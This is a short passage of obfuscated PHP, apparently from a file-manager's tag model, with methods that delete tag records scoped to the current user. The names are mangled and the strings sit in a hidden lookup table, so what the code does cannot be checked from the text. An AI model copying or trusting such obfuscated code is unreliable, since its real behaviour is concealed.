($this->where($d±Öá‚ŞŸá)->find()) { return !1; } return $this->add($d±Öá‚ŞŸá); } protected function removeFromTag($AòçÜŸŞ„, $Fùµè®ÃòÃ) { $DÂãÏ§Î» =& $_SERVER[õëù©û]; if (!Model($DÂãÏ§Î»[2268])->listData($Fùµè®ÃòÃ) || !Model($DÂãÏ§Î»[747])->pathInfo($AòçÜŸŞ„)) { return !1; } $A–Şñµá§Ù = array($DÂãÏ§Î»[1395] => USER_ID, $DÂãÏ§Î»[431] => $Fùµè®ÃòÃ, $DÂãÏ§Î»[384] => $DÂãÏ§Î»[378], $DÂãÏ§Î»[383] => $AòçÜŸŞ„); return $this->where($A–Şñµá§Ù)->delete(); } protected function removeByTag($Aš£—‚½°‹) { $aµ›¦§š  =& $_SERVER[õëù©û]; if (!$Aš£—‚½°‹) { return !1; } $eÙ“×Ê’ ¶ = array($aµ›¦§š [1395] => USER_ID, $aµ›¦§š [431] => $Aš£—‚½°‹); return $this->where($eÙ“×Ê’ ¶)->delete(); } protected function removeBySource($f¿Ì®ÀÔìÀ) { $EÀ…ğñ¹àµ =& $_SERVER[õëù©û]; $Aà…‰Ê¦Ö¥ = array($EÀ…ğñ¹àµ[1395] => USER_ID, $EÀ…ğñ¹àµ[383] => $f¿Ì®ÀÔìÀ, $EÀ…ğñ¹àµ[431] => array($EÀ…ğñ¹àµ[921], 0)); return $this->where($Aà…‰Ê¦Ö¥)->delete(); } }